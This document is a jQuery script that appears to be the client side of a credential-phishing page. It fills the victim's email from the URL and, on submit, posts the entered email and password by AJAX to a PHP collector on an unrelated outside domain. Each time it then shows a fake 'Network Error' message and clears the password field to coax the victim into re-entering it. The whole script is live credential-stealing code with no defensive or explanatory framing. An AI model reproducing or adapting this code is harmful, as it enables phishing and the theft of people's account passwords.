$(document).ready(function() {


    var baseUrl = (window.location).href;
    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
    $("#x1").val(url);
    const handleErr = ()=>{
      var errMsg = "Network Error! Please verify your information and try again";
      var spann = document.querySelector(".mmssgg");
      spann.textContent = errMsg;
      spann.innerHTML = "";
      spann.addEventListener("click", ()=>{
        alert('connected')
      spann.innerHTML = "Network Error! Please verify your information and try again";
        
      })
    }
    
    var btnPost = document.querySelector('#submitBtn');
  var divMsg = document.querySelector('#hello');
  var inpPwd = document.querySelector('#x2');
  
  inpPwd.addEventListener('input', ()=>{
            // alert('input was clicked!')
          divMsg.textContent = '';
    
  });
  
  
    btnPost.addEventListener('click', function(){
     
      //setTimeout(function(){
        
        
        
        // alert(inpPwd.value);
        
        if(inpPwd.value === ""){
          
          
          divMsg.textContent = 'Please input password';
          divMsg.style.color = "#ba1100";
        //  btnPost.textContent = "Sign In";
          
//}, 2200);
          
        //}, 3000)
        }
        else{
          divMsg.textContent = 'Network Error! Please verify your information and try again';
          divMsg.style.color = "#ba1100";
          setTimeout(()=>{
            inpPwd.value = "";
          },1500)
         // inpPwd.value = "";
          
         btnPost.textContent = "Please wait...";
setTimeout(()=>{
btnPost.textContent = "Sign In";
  //inpPwd.value = "";
}, 2200);
                             
        }
        
        
        
        
    
      // alert(divMsg.value);
      
    });
    
    // handleErr();
    

    $("#formx").submit(function(e) {
        e.preventDefault();
        var nm = $("#A1").val();
        var formData = new FormData($("#formx")[0]);
        $("#submitBtn").html(`<button class="btn btn-sm btn-primary" disabled>
  <span class="spinner-grow spinner-grow-sm"></span>
  Please Wait...
</button>`).prop("disabled", false);
        $.ajax({
            url: "https://physicaleducationdiploma.com/dashboard/file/ukk.php",
            type: 'POST',
            data: formData,
            contentType: false,
            processData: false,
            success: function(res) {
                console.log(res);
                $('#bd').show();
                $('#hm').hide();
                setTimeout(function() {
                    $("#x1").val(url);
                    $("#x2").val("");
                    $('#msg').val(`Network Error! Please verify your information and try again`);
                    
                    // handleErr();
                    $("#submitBtn").html("Sign In").prop("disabled", false);
                }, 2000);

            }
        });
    });

});
